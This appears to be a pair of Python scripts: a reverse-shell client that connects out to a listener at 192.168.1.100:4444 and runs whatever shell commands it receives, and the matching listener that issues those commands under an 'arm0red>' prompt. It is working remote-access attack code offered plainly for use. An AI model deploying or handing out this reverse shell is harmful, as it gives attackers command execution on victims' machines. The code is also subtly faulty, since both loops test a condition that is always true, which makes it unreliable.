#!/usr/bin/python

import os
import socket
import subprocess

HOST = '192.168.1.100' # The ip of the listener.
PORT = 4444 # The same port as listener.

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT)) # Connect to listener.
s.send(str.encode("[*] Connection Established!")) # Send connection confirmation.

while 1: # Start loop.
    data = s.recv(1024).decode("UTF-8") # Recieve shell command.
    if data == "quit" or "exit": 
        break # If it's quit, then break out and close socket.
    if data[:2] == "cd":
        os.chdir(data[3:]) # If it's cd, change directory.
    # Run shell command.
    if len(data) > 0:
        proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE) 
        stdout_value = proc.stdout.read() + proc.stderr.read() # Read output.
        output_str = str(stdout_value, "UTF-8") # Format output.
        currentWD = os.getcwd() + "> " # Get current working directory.
        s.send(str.encode(currentWD + output_str)) # Send output to listener.
    
s.close() # Close socket.


##
##

#!/usr/bin/python3

from socket import *

HOST = '' # '' means bind to all interfaces.
PORT = 4444 #  Port.

s = socket(AF_INET, SOCK_STREAM) # Create our socket handler.
s.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1) # Set is so that when we cancel out we can reuse port.
try:
    s.bind((HOST, PORT)) # Bind to interface.
    print("[*] Listening on 0.0.0.0:%s" % str(PORT)) # Print we are accepting connections.
    s.listen(10) # Listen for only 10 unaccepted connections.
    conn, addr = s.accept() # Accept connections.
    print("[+] Connected by", addr) # Print connected by ipaddress.
    data = conn.recv(1024).decode("UTF-8") # Receive initial connection.
    while 1: # Start loop.
        command = input("arm0red> ") # Enter shell command.
        conn.send(bytes(command, "UTF-8")) # Send shell command.
        if command == "quit" or "exit":
            break # If we specify 'quit' or 'exit', then break out of loop and close socket.
        data = conn.recv(1024).decode("UTF-8") # Receive output from command.
        print(data) # Print the output of the command.
except KeyboardInterrupt: 
    print("...listener terminated using [ctrl+c], Shutting down!")
    exit() # Using [ctrl+c] will terminate the listener.
    
conn.close() # Close socket.



##
##
